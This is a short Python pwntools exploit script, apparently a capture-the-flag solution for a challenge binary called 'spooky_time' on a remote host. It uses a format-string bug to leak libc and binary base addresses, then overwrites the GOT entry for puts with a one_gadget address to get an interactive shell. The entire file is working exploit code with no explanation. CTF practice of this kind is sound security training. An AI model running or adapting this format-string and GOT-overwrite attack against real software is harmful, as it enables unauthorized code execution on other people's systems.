#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"

r = remote("134.122.106.203",31268)
e = ELF('./spooky_time')

r.sendlineafter(b'say something scary!\n', b'%49$p%51$p')
r.recvuntil(b'I bet you can do better than \n')

leak = r.recvline().strip().split(b'0x')
libc_leak = int(leak[1], base=16) - 0x29D90
base_leak = int(leak[2], base=16) - 0x13C0

print("Libc:", hex(libc_leak))
print("Base:", hex(base_leak))

e.address = base_leak
one_gadget = libc_leak + 0xebcf1

r.sendlineafter(b'let\'s try one more time..\n', fmtstr_payload(8, { e.got['puts']: one_gadget }))
r.interactive()
r.close()